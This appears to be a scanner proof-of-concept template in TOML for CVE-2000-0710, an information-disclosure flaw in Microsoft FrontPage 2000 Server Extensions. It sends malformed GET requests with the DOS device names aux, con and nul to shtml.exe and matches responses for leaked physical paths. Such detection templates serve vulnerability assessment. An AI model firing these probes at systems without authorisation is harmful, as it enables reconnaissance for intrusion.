[info]
author = "ave"
description = "向目标 shtml.exe 发送包含 DOS 设备名称的畸形 URL 请求，检测响应中是否泄露服务器物理路径信息"
id = "POC-AVE-2000-0866"
name = "Microsoft FrontPage 2000 Server Extensions shtml.exe 信息泄露 PoC"
severity = "medium"
tags = ["ave-2000-0866"]
vuln_id = [
    "CVE-2000-0710",
    "AVE-2000-0866",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/_vti_bin/shtml.exe/aux"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    ':\',
    "drive",
    "path",
    "cannot find",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/_vti_bin/shtml.exe/con"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    ':\',
    "drive",
    "path",
    "cannot find",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/_vti_bin/shtml.exe/nul"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    ':\',
    "drive",
    "path",
    "cannot find",
]
